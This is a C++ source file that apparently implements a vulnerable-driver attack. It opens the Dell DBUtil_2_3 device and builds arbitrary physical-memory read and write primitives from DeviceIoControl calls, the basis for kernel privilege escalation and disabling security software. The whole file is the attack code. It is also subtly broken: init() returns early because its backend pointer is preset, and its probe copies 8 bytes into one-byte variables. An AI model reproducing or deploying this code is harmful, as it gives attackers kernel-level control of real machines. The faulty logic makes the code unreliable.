#include "r0.hpp"
#include <windows.h>
#include <cstring>

namespace r0 {

// DBUtil_2_3 backend only.
constexpr DWORD kRead  = 0xA0400C04;
constexpr DWORD kWrite = 0xA0400C08;

#pragma pack(push, 1)
struct Req {
    uint64_t addr;
    uint32_t size;
    uint8_t  buf[8];
    uint8_t  pad[4];
};
#pragma pack(pop)

HANDLE g_dev = INVALID_HANDLE_VALUE;

bool open_dev() {
    g_dev = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                        OPEN_EXISTING, 0, nullptr);
    return g_dev != INVALID_HANDLE_VALUE;
}

void close_dev() {
    if (g_dev != INVALID_HANDLE_VALUE) { CloseHandle(g_dev); g_dev = INVALID_HANDLE_VALUE; }
}

bool io(DWORD code, uint64_t pa, void* buf) {
    if (g_dev == INVALID_HANDLE_VALUE) return false;
    Req r{};
    r.addr = pa; r.size = 8;
    if (code == kWrite) memcpy(r.buf, buf, 8);
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, code, &r, sizeof(r), &r, sizeof(r), &got, nullptr))
        return false;
    if (code == kRead) memcpy(buf, r.buf, 8);
    return true;
}

bool rd8(uint64_t pa, void* out)  { return io(kRead,  pa, out); }
bool wr8(uint64_t pa, const void* in) {
    uint8_t tmp[8]; memcpy(tmp, in, 8);
    return io(kWrite, pa, tmp);
}

// Global backend pointer – initialised once by init().
static Backend g_be_local{L"\\\\.\\DBUtil_2_3", open_dev, close_dev, rd8, wr8};
static const Backend* g_be = &g_be_local;

bool init() {
    // Probe: open the device and do two reads of the same page that must agree.
    if (g_be) return true;
    if (!open_dev()) return false;
    uint8_t p1{};
    if (!rd8(0, &p1)) { close_dev(); return false; }
    uint8_t p2{};
    if (!rd8(0, &p2)) { close_dev(); return false; }
    bool ok = (p1 == p2);
    if (!ok) { close_dev(); return false; }
    g_be = &g_be_local;
    return true;
}

void shutdown() {
    if (g_be) { g_be->close(); g_be = nullptr; }
}

bool alive() { return g_be != nullptr; }

bool pread(uint64_t pa, void* buf, size_t len) {
    if (!g_be) return false;
    auto* p = static_cast<uint8_t*>(buf);
    for (size_t i = 0; i < len; i += 8) {
        uint8_t t[8]{};
        if (!g_be->read8(pa + i, t)) return false;
        size_t n = (len - i < 8) ? len - i : 8;
        memcpy(p + i, t, n);
    }
    return true;
}

bool pwrite(uint64_t pa, const void* buf, size_t len) {
    if (!g_be) return false;
    auto* p = static_cast<const uint8_t*>(buf);
    for (size_t i = 0; i < len; i += 8) {
        uint8_t t[8]{};
        size_t n = (len - i < 8) ? len - i : 8;
        memcpy(t, p + i, n);
        if (!g_be->write8(pa + i, t)) return false;
    }
    return true;
}

} // namespace r0